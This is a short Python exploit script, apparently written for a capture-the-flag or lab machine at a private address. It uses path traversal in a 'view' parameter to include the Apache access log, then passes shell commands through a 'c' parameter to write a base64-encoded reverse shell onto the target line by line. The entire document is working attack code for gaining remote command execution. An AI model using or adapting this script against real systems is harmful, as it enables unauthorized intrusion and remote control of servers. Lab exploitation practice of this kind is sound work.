#!/usr/bin/python3
import requests
import base64

url = 'http://10.10.46.63/index.php'
params = {
    'view': 'cat/../../../../var/log/apache2/access.log',
    'ext': ''
}

with open('./revshellb64', 'r') as handle:
    lines = [line.strip() for line in handle.readlines()]

    for line in lines:
        params['c'] = 'echo "' + line + '" >> revshell_b64'
        print(params['c'])
        r = requests.get(url, params=params)
